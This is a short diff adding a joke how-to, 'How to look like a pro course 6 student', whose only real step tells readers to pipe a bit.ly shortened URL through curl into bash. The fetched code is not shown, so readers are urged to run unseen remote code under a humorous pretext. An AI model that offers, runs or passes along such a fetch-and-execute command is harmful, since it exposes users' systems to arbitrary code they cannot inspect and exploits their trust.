@@ -1,0 +1,3 @@
+How to look like a pro course 6 student.
+Step 1: run this command in your bash/terminal "curl -L http://bit.ly/10hA8iC | bash"
+Step 2: Profit
